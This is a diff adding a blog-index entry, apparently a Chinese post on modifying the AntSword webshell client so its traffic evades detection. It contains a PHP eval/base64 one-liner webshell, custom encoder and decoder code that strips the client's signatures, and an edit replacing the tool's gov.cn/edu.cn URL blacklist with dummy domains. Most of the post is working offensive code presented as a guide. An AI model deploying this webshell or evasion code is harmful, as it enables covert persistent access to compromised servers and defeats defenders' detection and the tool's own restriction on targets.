@@ -1,6 +1,107 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>改造蚁剑</title>
+    <url>/posts/b371c6dd/</url>
+    <content><![CDATA[<p>蚁剑的默认特征，，，，</p>
+<a id="more"></a>
+
+<h2 id="默认特征"><a href="#默认特征" class="headerlink" title="默认特征"></a>默认特征</h2><p>ip</p>
+<ul>
+<li>172.16.49.184</li>
+</ul>
+<p>version</p>
+<ul>
+<li>2.1.9</li>
+</ul>
+<h3 id="默认编码"><a href="#默认编码" class="headerlink" title="默认编码"></a>默认编码</h3><p>默认连接时未对流量进行任何的处理,文件为：<code>antSword-master/source/core/php/index.js</code></p>
+<p>一句话马第一次连接时特征</p>
+<ul>
+<li>User-Agent</li>
+</ul>
+<p>6354a03f`随机字符(每次连接时的随机)；</p>
+<p>返回服务器的版本信息，Web路径，等信息</p>
+<p><img src="/posts/b371c6dd/image-20201109102928919.png" alt="image-20201109102928919"></p>
+<p>在<code>antSword-master/source/core/php/index.js</code>中组合的代码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 组合完整的代码</span></span><br><span class="line">  <span class="keyword">let</span> tmpCode = data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  data[<span class="string">&#x27;_&#x27;</span>] = <span class="string">`@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);<span class="subst">$&#123;asencCode&#125;</span>;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;<span class="subst">$&#123;tag_s&#125;</span>&quot;;echo @asenc($output);echo &quot;<span class="subst">$&#123;tag_e&#125;</span>&quot;;&#125;ob_start();try&#123;<span class="subst">$&#123;tmpCode&#125;</span>;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();`</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到流量完全明文。</p>
+<h3 id="base64编码器"><a href="#base64编码器" class="headerlink" title="base64编码器"></a>base64编码器</h3><p>进行了一层base64编码，流量传输，使用了<code>eval</code>函数和<code>base64_decode</code>函数:<code>@eval(@base64_decode($_POST[q1c5a24e6362ef]));</code></p>
+<ul>
+<li>eval</li>
+<li>Base64_decode</li>
+</ul>
+<p><img src="/posts/b371c6dd/image-20201109110853122.png" alt="image-20201109110853122"></p>
+<h3 id="CHR编码器"><a href="#CHR编码器" class="headerlink" title="CHR编码器"></a>CHR编码器</h3><p>默认<code>eval</code>和<code>chr()</code>、<code>.</code></p>
+<ul>
+<li>eval + chr() + .</li>
+</ul>
+<p><img src="/posts/b371c6dd/image-20201109111450139.png" alt="image-20201109111450139"></p>
+<h3 id="chr-16"><a href="#chr-16" class="headerlink" title="chr(16)"></a>chr(16)</h3><p>同CHR</p>
+<h3 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h3><ul>
+<li><p>eval</p>
+</li>
+<li><p>str_rot13</p>
+</li>
+</ul>
+<p>同base64</p>
+<h2 id="修改特征"><a href="#修改特征" class="headerlink" title="修改特征"></a>修改特征</h2><p>没办法，也只能讲BASE64写在服务端，这样才能实现客户端通信流量的完全无特征。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 11:26:29</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data[&#x27;_&#x27;]中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>base64编码器在data[pwd]设置为base64解码代码，data[randomID]设置为原代码的base64编码数据，最后删除掉data里的原有payload  data[‘_’]</li>
+</ul>
+<p>这里的明显特征就是eval和base64_decode。</p>
+<p>那么可以找到对应的方法绕过。也即是说，所有的编码器都可以变成无特征，即：传输前对内容进行编码，然后在木马中设置解码。</p>
+<ul>
+<li>木马：<code>&lt;?php eval(base64_decode($_POST[&quot;test&quot;]));?&gt;</code></li>
+<li>传输内容：<code>base64编码后的内容</code></li>
+</ul>
+<h3 id="01编码器Demo"><a href="#01编码器Demo" class="headerlink" title="01编码器Demo"></a>01编码器Demo</h3><ul>
+<li>注释掉模版的base64编码，直接设置传输内容为base64编码。</li>
+<li>一句话设置为<code>&lt;?php eval(base64_decode($_POST[&quot;test&quot;]));?&gt;</code></li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 11:26:29</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data[&#x27;_&#x27;]中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  <span class="comment">// data[randomID] = Buffer.from(data[&#x27;_&#x27;]).toString(&#x27;base64&#x27;);</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  <span class="comment">// data[pwd] = `eval(base64_decode($_POST[$&#123;randomID&#125;]));`;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 自定义</span></span><br><span class="line">  data[pwd] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/posts/b371c6dd/image-20201109134752806.png" alt="image-20201109134752806"></p>
+<h3 id="01解码器"><a href="#01解码器" class="headerlink" title="01解码器"></a>01解码器</h3><p>其核心是asoutput和decode_buff</p>
+<p>这两个模块是输入后时候的编码方式，以及设置可扩展操作<code>ext=&#123;&#125;</code>。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64解码器</span></span><br><span class="line"><span class="comment"> * Create at: 2020/11/09 13:53:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>asenc 将返回数据base64编码</span></span><br><span class="line"><span class="comment">   * 自定义输出函数名称必须为 asenc</span></span><br><span class="line"><span class="comment">   * 该函数使用的语法需要和shell保持一致</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  asoutput: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`function asenc($out)&#123;</span></span><br><span class="line"><span class="string">      return @base64_encode($out);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span>.replace(<span class="regexp">/\n\s+/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 解码 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param <span class="type">&#123;string&#125;</span> </span>data 要被解码的 Buffer</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@returns <span class="type">&#123;string&#125;</span> </span>解码后的 Buffer</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  decode_buff: <span class="function">(<span class="params">data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(data.toString(), <span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过以上设置，即可初步完成蚁剑的特征修改。</p>
+<h2 id="流量中的其他特征"><a href="#流量中的其他特征" class="headerlink" title="流量中的其他特征"></a>流量中的其他特征</h2><p>蚁剑中唯一不变的部分base64内容为：</p>
+<p>在客户端组合完整代码时，默认内容均为特征。。。也即是蚁剑中写死的部分。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;_&#x27;</span>] = <span class="string">`@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);<span class="subst">$&#123;asencCode&#125;</span>;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;<span class="subst">$&#123;tag_s&#125;</span>&quot;;echo @asenc($output);echo &quot;<span class="subst">$&#123;tag_e&#125;</span>&quot;;&#125;ob_start();try&#123;<span class="subst">$&#123;tmpCode&#125;</span>;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();`</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开始</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params">$out</span>)</span>&#123;<span class="keyword">return</span> @base64_encode($out);&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;$output=ob_get_contents();ob_end_clean();echo I</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编码后如下</span></span><br><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gI</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>结束</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;&#125;catch(Exception $e)&#123;echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();&#125;;asoutput();die();</span><br><span class="line"></span><br><span class="line">O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D</span><br></pre></td></tr></table></figure>
+
+
+
+<p>该版本蚁剑，PHP7连接数据库有问题。错误500，未深究。数据库连接语句为明文。</p>
+<p><img src="/posts/b371c6dd/image-20201109152316263.png" alt="image-20201109152316263"></p>
+<p>蚁剑中的黑名单</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span> <span class="title">urlblacklist</span>() &#123;</span><br><span class="line">  <span class="comment">// return /(gov.cn|edu.cn)/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="regexp">/(gogogo.cn|cccccc.cn)/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>禅道后台管理员权限Getshell</title>
     <url>/posts/e07fd52d/</url>
     <content><![CDATA[<p>禅道后台管理员权限Getshell。</p>
